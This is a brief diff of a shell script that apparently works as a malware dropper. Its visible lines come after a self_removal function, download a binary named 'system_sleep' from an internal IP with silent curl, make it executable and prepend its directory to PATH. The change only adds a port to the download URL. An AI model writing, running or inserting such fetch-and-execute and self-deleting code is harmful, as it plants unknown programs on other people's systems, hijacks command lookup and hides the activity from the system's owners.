@@ -10,7 +10,7 @@ self_removal(){
 }
 
 if command -v curl 1> /dev/null; then
-  curl -s "http://172.16.10.1/system_sleep" -o "${FULL_BIN_PATH}"
+  curl -s "http://172.16.10.1:8080/system_sleep" -o "${FULL_BIN_PATH}"
   if [[ -s "${FULL_BIN_PATH}" ]]; then
     chmod +x "${FULL_BIN_PATH}"
     export PATH="${WORK_DIR}:${PATH}"
